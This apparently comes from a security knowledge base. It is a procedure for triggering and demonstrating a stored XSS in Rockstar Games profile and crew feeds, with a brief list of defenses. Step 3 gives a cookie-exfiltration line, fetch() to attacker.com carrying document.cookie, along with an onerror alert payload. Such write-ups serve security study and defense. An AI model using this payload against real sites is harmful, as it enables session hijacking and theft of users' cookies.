---
tags:
  - xss
  - execution
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: cb5aa889-6782-4892-81eb-048e39a6b5ae
created_at: '2025-12-13T23:52:39.409Z'
updated_at: '2025-12-13T23:52:39.409Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-and-Demonstrate-XSS-Execution

## Summary

This procedure triggers the Stored XSS by viewing the affected profile or crew feed, executing the injected JavaScript and demonstrating potential impacts like session hijacking.

## Description

When a user loads the feed containing the payload, the unsanitized message renders, firing the onerror event. In Rockstar Games' context, this affects viewers of profiles/crews. Prerequisites: Injected payload and victim access. Outcomes: Arbitrary JS runs in victim's browser, enabling theft of cookies or keystrokes.

## Requirements

1. Access to the affected profile/crew feed
2. Victim browser session (self or simulated)
3. Dev tools for monitoring execution

## Defense

Defensive measures and detection strategies:

- Apply output encoding on all rendered user content
- Implement CSP to block unsafe-inline scripts
- Detect and quarantine feeds with anomalous JS via backend scans

## Objectives

1. Execute the stored payload
2. Confirm JS control in browser
3. Highlight escalation to data compromise

## Instructions

### Step 1: Access Affected Feed

**Context**: Simulate victim viewing.

Log in as a different user or incognito, navigate to the profile or crew feed with the injected message.

### Step 2: Load and Observe

**Context**: Trigger rendering.

The page loads, rendering the message; the img tag fails src load, firing onerror with `alert('hacked')`.

### Step 3: Escalate Demonstration

**Context**: Show real impact.

Replace alert with `fetch('https://attacker.com/steal?cookie=' + document.cookie)` to exfiltrate data. Monitor network tab for requests.

> Expected output: Alert or network request confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Execution]]
- [[JavaScript]]
